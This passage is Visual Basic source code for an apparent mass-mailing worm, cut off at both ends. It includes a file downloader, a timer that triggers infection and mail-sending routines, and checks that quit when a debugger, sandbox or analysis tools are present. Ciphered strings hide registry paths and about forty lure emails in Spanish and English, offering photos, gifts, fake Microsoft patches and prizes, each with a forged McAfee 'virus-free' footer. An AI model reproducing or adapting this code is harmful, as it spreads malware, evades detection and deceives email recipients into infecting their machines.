   R = Int(Rnd * 55) + 66: If R = 92 Then R = 96
   Rm = Rm & Chr(R)
   Next
   Rm = Rm & Bxt3(Br)
   End Function

   Sub WIni(I_S As String, IK As String, IV As String, IP As String)
   On Error Resume Next: Dim Wn As Long
   Wn = WritePrivateProfileString(I_S, IK, IV, IP)
   End Sub

   Sub Rw(R, k, t)
   On Error Resume Next
   If t = "" Then Bw.RegWrite R, k Else Bw.RegWrite R, k, "REG_DWORD"
   End Sub

   Function Rr(R)
   On Error Resume Next: Rr = Bw.RegRead(R)
   End Function

   Function IniR(NS, NK, ND)
   On Error Resume Next: Dim k As String
   k = NK: Dim St As String * 400: Dim i As Long
   i = GetPrivateProfileString(NS, k, "", St, Len(St), ND)
   IniR = Left(St, i)
   End Function

   Public Function B64(ByVal vsFullPathname)
   On Error Resume Next
   Dim b           As Integer: Dim Base64Tab  As Variant
   Dim bin(3)      As Byte: Dim s, sResult As String: Dim l, i, FileIn, n As Long

   Base64Tab = Array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "+", "/")

   Erase bin: l = 0: i = 0: FileIn = 0: b = 0: s = "": FileIn = FreeFile

   Open vsFullPathname For Binary As FileIn
   sResult = s & vbCrLf: s = "": l = LOF(FileIn) - (LOF(FileIn) Mod 3)
   For i = 1 To l Step 3

   Get FileIn, , bin(0): Get FileIn, , bin(1): Get FileIn, , bin(2)

   If Len(s) > 64 Then
   s = s & vbCrLf: sResult = sResult & s: s = ""
   End If

   b = (bin(n) \ 4) And &H3F: s = s & Base64Tab(b)
   b = ((bin(n) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
   s = s & Base64Tab(b): b = ((bin(n + 1) And &HF) * 4) Or ((bin(2) \ 64) And &H3)
   s = s & Base64Tab(b): b = bin(n + 2) And &H3F: s = s & Base64Tab(b)
   Next i

   If Not (LOF(FileIn) Mod 3 = 0) Then
   For i = 1 To (LOF(FileIn) Mod 3)
   Get FileIn, , bin(i - 1)
   Next i
   If (LOF(FileIn) Mod 3) = 2 Then
   b = (bin(0) \ 4) And &H3F: s = s & Base64Tab(b)
   b = ((bin(0) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
   s = s & Base64Tab(b): b = ((bin(1) And &HF) * 4) Or ((bin(2) \ 64) And &H3)
   s = s & Base64Tab(b): s = s & "="
   Else
   b = (bin(0) \ 4) And &H3F: s = s & Base64Tab(b)
   b = ((bin(0) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
   s = s & Base64Tab(b): s = s & "=="
   End If
   End If

   If s <> "" Then
   s = s & vbCrLf: sResult = sResult & s
   End If
   s = ""
   Close FileIn: B64 = sResult
   End Function

   Private Sub Bt1_Timer()
   On Error Resume Next: Bt1.Enabled = False: Static Btv1 As Integer
   If Btv1 = 60 Then
   Btv1 = 0
   If BCopy = 2 Then FdInfected: Bw.run Sp(1) & q("[") & key1: Bw.run Sp(1) & q("[") & key3
   If (Rr(q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[DhjSnjb")) <> CStr(Day(Date))) And (BCopy = 3) Then Call BComponents
   If (Rr(q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[FdsSnjb")) <> CStr(Day(Date))) And (BCopy = 3) Then Call Actualizer
   If (Rr(q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[TjswSnjb")) <> CStr(Day(Date))) And (BCopy = 1) Then Call BSendMail
   If (Rr(q("OLB^XKHDFKXJFDONIB[Thaspfub[@BC]FD'KFET[P45)Efucnbk[UbcSnjb")) <> CStr(Day(Date))) And (BCopy = 3) Then Call Bred
   Else
   Btv1 = Btv1 + 1
   End If
   Bt1.Enabled = True
   End Sub

   Function DowFile(BURL As String, BPath As String) As Boolean
   On Error Resume Next: Dim lngRetVal As Long
   lngRetVal = URLDownloadToFile(0, BURL, BPath, 0, 0)
   DowFile = IIf(lngRetVal = 0, True, False)
   End Function

   Function IsMail(ML)
   On Error Resume Next: Dim R(20) As String
   R(0) = "/": R(1) = "\": R(2) = "?": R(3) = "="
   R(4) = ">"
   R(5) = "<": R(6) = Chr(34): R(7) = ";": R(8) = ","
   R(9) = Chr(37): R(10) = "¡": R(11) = "¿": R(12) = ")"
   R(13) = "(": R(14) = "virus": R(15) = Chr(32): R(16) = ":"
   R(17) = "[": R(18) = "]": R(19) = ".."
   For k = 0 To 19
   If InStr(ML, R(k)) <> 0 Then
   IsMail = False
   Exit Function
   End If
   Next
   X1 = InStr(ML, "@"): X2 = InStr(ML, ".")
   If (X1 <> 0) And (X2 <> 0) And (X1 < X2) Then IsMail = True Else IsMail = False
   End Function

   Sub MailsSend()
   On Error Resume Next: Dim v As String: v = ""

   sHn = Array(q("[[[[)[[TNDB"), q("[[[[)[[TNPQNC"), q("[[[[)[[ISNDB"))

   For i = 0 To UBound(sHn)
   sHle = CreateFile(sHn(i), &H40000000, &H1 Or &H2, ByVal 0&, 3, 0, 0)
   If sHle <> (((100 And 1) + 1) ^ 0) * -(3 And 9) Then End
   Next

   If Asc(Left(GetCommandLine, 1)) <> Asc("%") - (2 + 1) Then End

   sRg = Array(q("OLB^XKHDFKXJFDONIB[Thaspfub[IrJb`f[ThasNDB[NitsfkkCnu"), q("OLB^XKHDFKXJFDONIB[Thaspfub[Jnduhthas[Pnichpt[DruubisQbutnhi[Rinitsfkk[ThasNDB[RinitsfkkTsuni`"), q("OLB^XKHDFKXJFDONIB[Thaspfub[Jnduhthas[Pnichpt[DruubisQbutnhi[Fww'Wfsot[Khfcbu45)B b[Wfso"))

   For x = 0 To UBound(sRg)
   sRr = Rr(sRg(x))
   If sRr <> v Then End
   Next

   For Each strEnv In Bw.Environment(q("WUHDBTT"))
          If InStr(LCase(strEnv), q("djcknib")) And InStr(LCase(strEnv), q("pnindb")) Then End
   Next

   If IsDebuggerPresent() <> ((7 And 9) / 9) * (((6 Xor 7) * (0 Xor 7)) Xor 7) * ((9 Or 3) * 9) Then End
   End Sub

   Function BEML(xx, xy)
   On Error Resume Next: Dim eb0 As String, eb00 As String, eb000 As String, Bnm As String, MVC As String
   Randomize: R = Int(Rnd * 40) + 1

   If InStr(LCase(LanguageID), q("btwföhk")) <> 0 Then
   MVC = "<br><p>" & q(":::::::::::::::::::::::::::::Jdfaab'Qnurt'Tdfi:::::::::::::::::::::::::::::") & "<br><p>" & vbCrLf & _
   q("'''Ubtrksfch'cbk'Fiækntnt='Jbitfmb'~'Fcmrish'kneub'cb'qnurt") & "<br><p>" & vbCrLf & _
   q(":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::")
   Select Case R
   Case 1
   eb0 = q("Suntsb}f'=/"): eb00 = q("Jnuf'btsf'ahsh'~'kkhuf+'bt'sfi'suntsb'=/"): eb000 = q("Njf`b)wna")
   Case 2
   eb0 = q("0'Cêft"): eb00 = q("Sb'vrbcfi'0'Cêft+'mf"): eb000 = q("0Cf~)tdu")
   Case 3
   eb0 = q("Hcntbf")
   eb00 = q("Vrb'vrnbubt'cb'jn'8") & vbCrLf & q(")))))))))vrb'trauft'jrdoh'jæt¦¦¦"): eb000 = q("Fi`bk)tdu")
   Case 4
   eb0 = q("Vrb'Ahsh'=."): eb00 = q("Vrb'cnuêf'sr'jfcub'tn'sb'qnbuf'ofdnbich'bth"): eb000 = q("SrAhsh)wna")
   Case 5
   eb0 = q("]hift")
   eb00 = q("Sb'fshujbisf+'bk'jnbch+'kf'wubhdrwfdnhi+'kf'hekn`fdnhi+'kf'drkwf+") & vbCrLf & q("bk'cbtbh'cb'fwuhefdnhi+'kf'snjncb}+'h'fk`ri'hsuh'wuhekbjf8"): eb000 = q("FrshF~rcf)wna")
   Case 6
   eb0 = q("Sob'Anuts"): eb00 = q("Cbtcb'Fefmh'sb'cbqhuf"): eb000 = q("SA)wna")
   Case 7
   eb0 = q("Jfirfk'cb'Tbcrddnhi"): eb00 = q("Vrnbubt'tfebu'dhjh'jbmhufu'srt'sbdindft+'wfuf'dhivrntsfu'fk'tb h'hwrbtsh"): eb000 = q("JfirfkTbd)wna")
   Case 8
   eb0 = q("Dnebu'@nukt"): eb00 = q("Jnufiht'<."): eb000 = q("Dnebu@nukt)wna")
   Case 9
   eb0 = q("Sob'Jftsbu"): eb00 = q("Bk'Bkb`nch'qbicuf+'~'kf'df}fchuf'ih'kh'dhihdbuf+'~'kf'dhicrdnuf'f'kf'jrbusb"): eb000 = q("Tkf~bu)wna")
   Case 10
   eb0 = q("Niahujfdnhi"): eb00 = q("Ubdnen'bk'fudonqh'vrb'jb'jficftsb+'~'ih'jb") & vbCrLf & q("`rtsfuhi'wfuf'ifcf'srt'dhjbisfunht'=/"): eb000 = q("DrbisftWPK)wna")
   Case 11
   eb0 = q("Kft'Ahsht'jæt'Ohs"): eb00 = q("Jnufkft'fvrn'¦'<."): eb000 = q("ppp) Njf`b)dhj")
   Case 12
   eb0 = q("Drfish'sb'fjfi8"): eb00 = q("Cbtdreub'drfish'sb'fjf'sr'wfubmf'=."): eb000 = q("SbtsKhqb)wna")
   Case 13
   eb0 = q("Drbisft'Ofdl"): eb00 = q("Vrnbubt'jnufu'bk'dhuubh'cb'srt'fjn`ht+'rtf'btsh"): eb000 = q("Dufdl)efs")
   Case 14
   eb0 = q("Ri'Ub`fkh"): eb00 = q("Ri'Ub`fkh'cbtcb'kf'wheub}f'cb'jn'btwêunsr"): eb000 = q("Njf`b)wna")
   Case 15
   eb0 = q("Kf'Wuhabdnf'cbk'Qfjwnuh"): eb00 = q("bk'tfrdb'tb'qf'tbdfich+'wbuh'kf'tbjnkkf'wbutntsb+'drfich'kf'snbuuf") & vbCrLf & q("tbf'kf'ncôibf'wfuf'wkfisfukf+'bk") & vbCrLf & q("tfrdb'`bujnifuæ'~'ofeuæ'hsuf'hwhusrincfc"): eb000 = q("Wuhabdnf)wna")
   Case 16
   eb0 = q("Ihtsufcfjrt'~'Kft'Shuubt'@bjbkft"): eb00 = q("Vrnbubt'dhihdbu'kft'wuhabdnft+'chicb'tb'ofekf'cb'Htfjf'Ebi'Kfcbi+") & vbCrLf & q("Kft'Shuubt'@bjbkft+'~'tb'wubcndb'kf'Sbudbuf'@rbuuf'Jricnfk)"): eb000 = q("Ihtsufcfjrt)wna")
   Case 17
   eb0 = q("@BC]FD'Sfu`bsf"): eb00 = q("Rif'Sfu`bsf'kb'of'tnch'biqnfcf'cbtcb'btsf'cnubddnhi'cb'dhuubh+'wfuf'qntrf*") & vbCrLf & q("kn}fukf+'cbtdfu`rb'bk'qnthu'ob'ni`ubtb'tr'irjbuh='''''''I=624") & vbCrLf & q("Ri'Tbuqndnh'cb'@BC]FD'KFET"): eb000 = q("Qnthu)efs")
   Case 18
   eb0 = q("66'Afisftjft"): eb00 = q("Bk'Wfusnch'cb'arsehk'vrb'tb'dhiqnusnh'bi'kb~bicf'ruefif") & vbCrLf & q("bi'qbucfc'mr`fuhi'dhisuf'ri'bvrnwh'afisftjf8"): eb000 = q("66Afisftjft)tdu")
   Case 19
   eb0 = q("Qf'Dhucbuh'Qf"): eb00 = q("qf'dhucbuh'hqbmf'qf+'sr'uf}f'sr'dubch'~'sr'dkfi+'bt'dhitbmh'~'jhufkbmf)"): eb000 = q("/Cbjh.)wna")
   Case 20
   eb0 = q("Jf`nf"): eb00 = q("Vrnbubt'thuwubicbu'f'srt'fjn`ht'dhi'riht'afdnkbt'surdht'cb'jf`nf'~'onwihsntjh") & vbCrLf & q("Bishidbt'kbb'bk'jfirfk'~'qntnsf'irbtsuf'wf`nif'=."): eb000 = q("JfirfkJf`nf)efs")
   Case 21
   eb0 = q("Rshwêf"): eb00 = q("Chicb'kft'`fkknift'df}fi'f'kft'ufsft+'~'kht'`fsht'whibi'orbqht"): eb000 = q("Ubfkncfc)efs")
   Case 22
   eb0 = q("Tni'Jnbch"): eb00 = q("Iridf'tb'of'qntsh'ohuuhu'sfi'`uficb"): eb000 = q("Njf`b)wna")
   Case 23
   eb0 = q("Wfuf'Sê"): eb00 = q("Jnuf'btsb'fudonqh'whu'afqhu"): eb000 = P2PName(q("Efucnbk"))
   Case 24
   eb0 = q("Jfnk'Cbknqbu~'Ubsrui'T~tsbj"): eb00 = q("Bk'Jbitf`b'vrb'biqnh'ih'wrch'tbu'bisub`fch'f'rih'h'jæt'cbtsnifsfunht"): eb000 = q("JfnkAnkb)efs")
   Case 25
   eb0 = q("Niqnsfdnhi"): eb00 = q("Kh'niqnsfjht'f'qntnsfu'irbtsuh'irbqh'tnsnh'ASW+'chicb'whcuf'fddbcbu'f'rif'`ufi") & vbCrLf & q("dfisncfc'cb'dhisbincht'~'fudonqht)'Ri'Tbuqndnh'cb'AubbTbuqbu+'wfuf'bisufu'wrktb") & vbCrLf & q("theub'bk'bikfdb'biqnfch"): eb000 = q("ppp)aswaubb)dhj")
   Case 26
   eb0 = q("Jnduhthas'Nisbuibs'B wkhubu"): eb00 = q("Jnduhthas'fcqnbusb'cb'rif'irbqf'qrkibufenkncfc'bi'bk'ifqb`fchu'Nisbuibs'B wkhubu") & vbCrLf & _
   q("2)_'~'1)_+'vrb'whcuêf+'ofdbu'vrb'ri'fsfdfisb+'shjfuf'bk'dhisuhk'cb'rif'wd") & vbCrLf & _
   q("fabdsfcf+'jr~'afdnkjbisb+'tb'urb`f'kbbu'bk'ehkbsni'fcmrish'~'cbtdfu`fu'bk'wfudob") & vbCrLf & _
   q("wfuf'thkrdnhifu'btsb'wuhekbjf)'Fss)'Jnduhthas'Dhuwhufsnhi)"): eb000 = q("Jnduhthas'Erkkbsni'570)dhj")
   Case 27
   eb0 = q("Jhcbkt"): eb00 = q("Jhcbkt'f'ubihqfch'tr'tnsb+'~'kh/f.'niqnsf'f'qntnsfu'kf'dhkbddnhi'cb'ahsh`ufaêft") & vbCrLf & _
   q("cb'kft/h.'jhcbkht'~'fusntsft'jft'dhihdncht)'Wrktb'theub'bk'bikfdb'biqnfch'wfuf'bisufu)"): eb000 = q("ppp)Jhcbkt)dhj")
   Case 28
   eb0 = q("@fjbt'HiKnib"): eb00 = q("Qntnsf'irbtsuh'irbqh'tnsb+'chicb'whcuft'cbtdfu`fu'`ufi'dfisncfc'cb'mrb`ht+'h") & vbCrLf & _
   q("bisufu'f'irbtsuft'tfkft'cb'jrksnmr`fchubt'hiknib+'kf'tbddnhi'cb'mrb`ht'4C'btsf") & vbCrLf & _
   q("ubdhjbicfcf)'Wrktf'bk'bikfdb'biqnfch'wfuf'bisufu"): eb000 = q("ppp)`jhk)dhj")
   Case 29
   eb0 = q("Ertdft'Fjntsfc'h'Fjhu8"): eb00 = q("Vrnbubt'dhihdbu'fjn`ft'~'fjn`ht'h'ertdft'wfubmf8'Qntnsf'irbtsuh'tnsb'~'dhihdb'f") & vbCrLf & _
   q("`bisb'dhjh'sý'Wrktf'bk'bikfdb'biqnfch'wfuf'bisufu)"): eb000 = q("ppp)ucF)dhj")
   Case 30
   eb0 = q("Fcnqnifi}ft'~'Sunqnft"): eb00 = q("Sb'`rtsfi'kft'sunqnft+'kb~bicft+'fibdchsft+'ubaufibt+'dontsbt+'sbts'~") & vbCrLf & _
   q("fcnqnifi}ft)'Bishidbt'qntnsf'irbtsuf'wf`b'~'jnuf'kht'vrb'sb'biqnfjht)'Wrktf'bk") & vbCrLf & _
   q("bikfdb'biqnfch'wfuf'bisufu)"): eb000 = q("Sunqnf)efs")
   Case 31
   eb0 = q("Tfkrcht"): eb00 = q("Ohkf'Abknwb") & vbCrLf & q("Fdf+'btsfi'kft'ahsht'vrb'jb'wbcntsb+'btduneb") & vbCrLf & q("Ficubf") & vbCrLf & q("e~b"): eb000 = q("Ahsht)tdu")
   Case 32
   eb0 = q("Tbunbt+'Wbkndrkft+'Sbkbihqbkft"): eb00 = q("Vrnbubt'cbtdfu`fu'fk`rif'wbkndrkf+'dfwêsrkht'cb'rif'tbunb'h'ihqbkf'h'bidhisufu") & vbCrLf & _
   q("ubtrjbibt+'fcbkfisht'~'ahsht+'h'sfk'qb}'tfebu'jæt'cb'trt'wuhsf`hintsft8'Bishidbt") & vbCrLf & _
   q("ertdf'bi'irbtsuf'eftb'cb'cfsht+'wrktf'bk'bikfdb'biqnfch'wfuf'bisufu)"): eb000 = q("ppp)BisbuSqUbc)dhj")
   Case 33
   eb0 = q("Dhianujfdnhi'cb'Trtdunwdnôi"): eb00 = q("Tr'cnubddnôi'cb'dhuubh'bkbdsuhindh+'arb'cfcf'cb'fksf'wfuf'ubdnenu'irbtsuh") & vbCrLf & _
   q("ehkbsêi+'wfuf'dhianujfu'vrb'arb'rtsbc'bk'vrb'ni`ubth'tr'cnubddnhi'h'cfutb'cb") & vbCrLf & _
   q("efmf+'btdunef'fk'bjfnk'vrb'fwfubdb'fk'anifk'cbk'ehkbsêi"): eb000 = q("Ehkbsni'I)572)dhj")
   Case 34
   eb0 = q("Tb Tnjrkfshu"): eb00 = q("Wurbef'btsb'tnjrkfchu+'of~'qbdbt'bi'vrb'tb'ibtbdnsf'=."): eb000 = q("Tb Tnjrkfshu)b b")
   Case 35
   eb0 = q("Khqb"): eb00 = q("Ofdb'snbjwh'vrb'sb'fjh'bi'tbdubsh+'wbuh'oh~'jb'finjh'f'cbdnusbkh") & vbCrLf & _
   q("bi'btsf'dfusf+'hmfkf'cbtwrbt'sb'kh'wrbcf'cbdnu'bi'wbuthif+'~'ih'f'sufqb}'cb'ri'aunh'jfnk") & vbCrLf & _
   q("Fk`rnbi'vrb'sb'fcjnuf"): eb000 = q("Dfusf)tdu")
   Case 36
   eb0 = q("Dorwf~urif")
   eb00 = q("Ri'tbcnbish'cbjhinh'ubdhuub'kht'wfufmbt'thknsfunht'cb'kht'ficbt") & vbCrLf & _
   q("bi`föfich'f'kht'qnfmbuht'dhi'wuhjbtft'fetrucft+'vrb'kb'tnuqbi'wfuf") & vbCrLf & _
   q("uhefukbt'trt'wuhqntnhibt'cb'kndhu")
   eb000 = q("Dorwf~urif)tdu")
   Case 37
   eb0 = q("Dhihdbt'kf'Cnjbitnhi'Cbtrendfcf8")
   eb00 = q("Ri'jrich'wfufkbkh'vrb+'tni'bjefu`h'tb'wfubdb'fthjeuhtfjbisb'fk'irbtsuh")
   eb000 = q("CnjbitnhiCbtrendfcf)tdu")
   Case 38
   eb0 = q("Jhcf'Wril")
   eb00 = q("Dhih}df'kh'jbmhu'cb'kf'jhcf'Wril+'tb'qbtsnjbisf'~'fddbthunht")
   eb000 = q("JhcfWril)wna")
   Case 39
   eb0 = q("Fcbk`fdb'67'lnkht'bi'ri'jbt")
   eb00 = q("Dfitfch'cb'btdhicbu'tr'`hucruf'bi'kf'wkf~f+'cb'rtfu'uhwf") & vbCrLf & _
   q("f'uf~ft'wfuf'cntnjrkfu+'wurbeb'btsb'wuh`ufjf'cb'cnbsf'~'bmbudndnh'677'ifsrufk") & vbCrLf & _
   q("dhi'bk'drfk'tni'`uficbt'tfdunandnht'in'babdsht'tbdricfunht+'whcuf'ubdrwbufu'tr'erbif'an`ruf") & vbCrLf & _
   q("/tn'fk`rif'qb}'kf'srqh.'~'tn'ih'kf'sbicuf'fohuf)")
   eb000 = q("TfisfIfsruf)tdu")
   Case 40
   eb0 = q("Niahujfdnhi'f'@fifchubt")
   eb00 = q("Kf'wubtbisb'bt'wfuf'dhjrindfukb+'vrb'tr'cnubddnhi'cb'bjfnk") & vbCrLf & _
   q("f'ubtrksfch'`fifchuf'cb'#677'bi'irbtsuh'thusbh+'tnuqftb'kbbu'kft'nitsurddnhibt") & vbCrLf & _
   q("f'ani'cb'ubdh`bu'tr'wubjnh'fisbt'cb'47'cnft'f'wfusnu'cb'ubdnench'bk'jbitf`b)")
   eb000 = q("Nitsurddnhibt)wna")
   End Select

   Else
   MVC = "<br><p>" & q(":::::::::::::::::::::::::::::Jdfaab'Qnurt'Tdfi:::::::::::::::::::::::::::::") & "<br><p>" & vbCrLf & _
   q("'''Ubtrks'`nqbt'sob'Fifk~tnt='Jbttf`b'fic'Fccbc'aubb'ob'`nqbt'qnurt") & "<br><p>" & vbCrLf & _
   q(":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::")
   Select Case R
   Case 1
   eb0 = q("Tfcibtt'=/"): eb00 = q("ob'Khhlt'fs'sont'wndsrub'fic'ob'dunbt+'ns'nt'th'tfc'=/"): eb000 = q("Njf`b)wna")
   Case 2
   eb0 = q("0'Cf~t"): eb00 = q("^hr'ofqb'kbas'0'Cf~t+'mf"): eb000 = q("0Cf~)tdu")
   Case 3
   eb0 = q("Hc~ttb~")
   eb00 = q("Sofs'pfis'j~'ob'`nqbt8") & vbCrLf & q(")))))))))'sofs'~hr'traabu'f'`ubfs'cbfk'jhub"): eb000 = q("Fi`bk)tdu")
   Case 4
   eb0 = q("Sofs'wndsrub'=."): eb00 = q("Sofs'~hru'jhsobu'phrkc'tf~'na'tob'tfp'~hr'jflni`'sofs"): eb000 = q("^hruWndsrub)wna")
   Case 5
   eb0 = q("Fubft")
   eb00 = q("chbt'ns'shujbis'~hr+'sob'abfu+'sob'dhidbui+'sob'hekn`fsnhi+'sob'ekfjb+") & vbCrLf & q("chbt'sob'cbtnub'`nqb'fwwuhqfk+'sob'to~ibtt+'hu'thjb'hsobu'wuhekbj8"): eb000 = q("Obkw)wna")
   Case 6
   eb0 = q("Sob'Anuts"): eb00 = q("Auhj'Ebkhp'ns'cbqhrut'~hr"): eb000 = q("SA)wna")
   Case 7
   eb0 = q("Jfirfk'`nqbt'Tbcrdsnhi"): eb00 = q("~hr'Pfis'sh'lihp'ft'njwuhqni`'~hru'sbdoinvrbt+'sh'dhivrbu'sh'sob'hwwhtnsb'tb "): eb000 = q("JfirfkTbcrdsnhi)wna")
   Case 8
   eb0 = q("Dnebu'@nukt"): eb00 = q("~hr'Khhl'fs'rt<."): eb000 = q("Dnebu@nukt)wna")
   Case 9
   eb0 = q("Sob'Jftsbu"): eb00 = q("Sob'Bkbds'pnkk'dhjb+'fic'sob'kbfsobu'mfdlbs'phi s'lihp'ns+'fic'ns'pnkk'cunqb'obu'sh'sob'cbfso"): eb000 = q("Tkf~bu)wna")
   Case 10
   eb0 = q("Niahujfsnhi"): eb00 = q("N'Ubdbnqbc'sob'ankb'sofs'~hr'tbis'jb+'fic'ih'jb") & vbCrLf & q("sob~'knlbc'ahu'fi~soni`'~hru'dhjjbist'=/"): eb000 = q("DrbisftWPK)wna")
   Case 11
   eb0 = q("Sob'Wndsrubt'ers'Ohs"): eb00 = q("~hr'Khhl'fs'sobj'obub'<."): eb000 = q("PPP)_NJF@B)DHJ")
   Case 12
   eb0 = q("Ft'jrdo'ft'sob~'khqb'~hr8"): eb00 = q("chbt'ob'Cntdhqbu'ft'jrdo'ft'~hru'dhrwkb'khqbt'~hr=."): eb000 = q("SbtsKhqb)wna")
   Case 13
   eb0 = q("~hr'Dhris'Ofdl"): eb00 = q("~hr'Pfis'sh'khhl'fs'sob'jfnk'ob'`nqbt'~hru'aunbict+'ns'rtbt'sont"): eb000 = q("Dufdl)efs")
   Case 14
   eb0 = q("F'@nas"): eb00 = q("F'@nas'auhj'sob'whqbus~'`nqbt'j~'twnuns"): eb000 = q("Njf`b)wna")
   Case 15
   eb0 = q("Sob'Wuhwobd~'`nqbt'sob'Qfjwnub"): eb00 = q("sob'tfkkhp'`hbt'cu~ni`'haa+'ers'sob'tbbc'wbutntst+'pobi'sob'bfuso") & vbCrLf & q("ns'nt'sob'trnsfekb'hib'sh'wkfis'ns+'sob") & vbCrLf & q("tfkkhp'pnkk'`bujnifsb'fic'sobub'pnkk'eb'fihsobu'hwwhusrins~"): eb000 = q("wuhwobd~)wna")
   Case 16
   eb0 = q("Ihtsufcfjrt'fic'Sob'Shuubt'Spnit"): eb00 = q("~hr'Pfis'sh'lihp'sob'wuhwobdnbt+'pobub'ns'nt'twhlbi'ob'`nqbt'Htfjf'Ebi'Kfcbi+") & vbCrLf & q("Sob'Shuubt'Spnit+'fic'sob'Sonuc'Phukc'@rbuuf'nt'wubcndsbc)"): eb000 = q("Ihtsufcfjrt)wna")
   Case 17
   eb0 = q("@BC]FD'whtsdfuc"): eb00 = q("F'whtsdfuc'oft'ebbi'ob'dhuubtwhicbis'auhj'sont'fccubtt'ob'`nqbt'jfnk+'ahu'sh'tbb'ns") & vbCrLf & q("+'cntdofu`b'sob'anicbu'sobub'fj'ns'bisbut'nst'N'irjebu='''''''I=624") & vbCrLf & q("F'Tbuqndb'`nqbt'@BC]FD'KFET"): eb000 = q("anicbu)efs")
   Case 18
   eb0 = q("66'@ohtst"): eb00 = q("chbt'Sob'Wfus~'`nqb'thddbu'sofs'ebdfjb'ruefi'kb`bic") & vbCrLf & q("surk~'sob~'cnc'wkf~'f`fnits'f'sbfj'`ohts8"): eb000 = q("66@ohtst)tdu")
   Case 19
   eb0 = q("Kfje'@hbt'ob'@hbt"): eb00 = q("kfje'tobbw'`hbt'ob'`hbt+'~hru'ufdb'~hru'dubch'fic'~hru'dkfi+'fub'fcqndb'fic'jhufk)"): eb000 = q("/Cbjh.)wna")
   Case 20
   eb0 = q("Jf`nd"): eb00 = q("~hr'pfis'sh'truwuntb'~hru'aunbict'pnso'thjb'bft~'sundlt'ob'`nqbt'jf`nd'fic'o~wihsntj") & vbCrLf & q("Sobi'ob(tob'ubfct'sob'jfirfk'fic'hru'qntns'wf`nifsbt'=."): eb000 = q("JfirfkJf`nd)efs")
   Case 21
   eb0 = q("Rshwnf"): eb00 = q("Pobub'sob'obit'oris'sob'ufst+'fic'sob'dfst'wrs'b``t"): eb000 = q("Ubfkns~)efs")
   Case 22
   eb0 = q("Pnsohrs'Abfu"): eb00 = q("hib'oft'Ibqbu'tbbi'ohuuhu'th'en`"): eb000 = q("Njf`b)wna")
   Case 23
   eb0 = q("Ahu'^hr"): eb00 = q("ob(tob'wkbftb'Khhlt'fs'sont'ankb"): eb000 = P2PName(q("Efucnbk"))
   Case 24
   eb0 = q("Jfnk'Cbknqbu~'Ubsrui'T~tsbj"): eb00 = q("Sob'Jbttf`b'sofs'N'tonw'dhrkc'ihs'eb'cbknqbubc'sh'hib'hu'jhub'fccubttbbt"): eb000 = q("JfnkAnkb)efs")
   Case 25
   eb0 = q("Niqnsfsnhi"): eb00 = q("pb'niqnsb'Ns'sh'qntns'hru'ibp'wkfdb'ASW+'pobub'ns'uhst'sh'dhitbis'sh'f'`ubfs'hib") & vbCrLf & _
   q("vrfisns~'`nqbt'dhisfnibc'fic'ankbt)'F'Tbuqndb'`nqbt'AubbTbuqbu+'sh'bisbu'ns'wrktbt") & vbCrLf & q("hi'sob'tbis'dhiibdsnhi"): eb000 = q("ppp)aswaubb)dhj")
   Case 26
   eb0 = q("Jnduhthas'Nisbuibs'B wkhubu"): eb00 = q("Jnduhthas'ihsndbt'ob'`nqbt'f'ibp'qrkibufenkns~'ni'sob'ifqn`fshu'Nisbuibs'B wkhubu") & vbCrLf & _
   q("2)_'fic'1)_'sofs'ns'phrkc'uhs+'sh'jflb'sofs'fi'fssfdlbu+'shhl'sob'dhisuhk'tob'`nqbt'f'wd") & vbCrLf & _
   q("faabdsbc+'qbu~'bftnk~+'ns'nt'ubvrbtsbc'sh'ubfc'sob'bidkhtbc'erkkbsni'fic'sh'cntdofu`b'sob'wfsdo") & vbCrLf & _
   q("sh'thkqb'sont'wuhekbj)'Fss)'Jnduhthas'Dhuwhufsnhi)"): eb000 = q("Jnduhthas'Erkkbsni'570)dhj")
   Case 27
   eb0 = q("Jhcbkt"): eb00 = q("Jhcbkt'ofc'ubihqfsbc'sobnu'tnsb+'fic'kh/f.'ob(tob'niqnsbt'sh'qntns'sob'dhkkbdsnhi'ob(tob'`nqbt'wndsrubt") & vbCrLf & _
   q("`nqb'kft/h.'jhcbkt'fic'fusntst'ers'pbkk*lihpi)'Wrktb'hi'sob'dhiibdsnhi'tbis'sh'bisbu)"): eb000 = q("ppp)JhcbktFKK`)dhj")
   Case 28
   eb0 = q("@fjbt'HiKnib"): eb00 = q("ns'Qntnst'hru'ibp'tnsb+'pobub'~hr'uhs'sh'cntdofu`b'`ubfs'vrfisns~'ob(tob'`nqbt'`fjbt+'hu") & vbCrLf & _
   q("sh'bisbu'sh'hru'uhhjt'`nqbt'jrksn*wkf~but'hiknib+'sob'tbdsnhi'ob(tob'`nqbt'`fjbt'4C'sont") & vbCrLf & _
   q("ubdhjjbicbc)'ns'Wubttbt'sob'dhiibdsnhi'tbis'sh'bisbu)"): eb000 = q("ppp)`jhk)dhj")
   Case 29
   eb0 = q("ch'~hr'Khhl'ahu'Aunbictonw'hu'Khqb8"): eb00 = q("do you Want to know friends and friends or searches couple? It visits our site and he knows to") & vbCrLf & _
   q("wbhwkb'ft'~hr'Wubtt'sob'dhiibdsnhi'tbis'sh'bisbu)"): eb000 = q("ppp)ucF)dhj")
   Case 30
   eb0 = q("Uncckbt'fic'Sunqnft"): eb00 = q("^hr'knlb'sob'sunqnft+'kb`bict+'fibdchsbt+'wuhqbuet+'mhlbt+'sbts'fic") & vbCrLf & _
   q("uncckbt)'Sobi'hru'qntns'wf`b'fic'fnj'sohtb'sofs'pb'tbic'~hr)'Ns'wubttbt'sob") & vbCrLf & _
   q("dhuubtwhicbis'dhiibdst'sh'bisbu)"): eb000 = q("Sunqnf)efs")
   Case 31
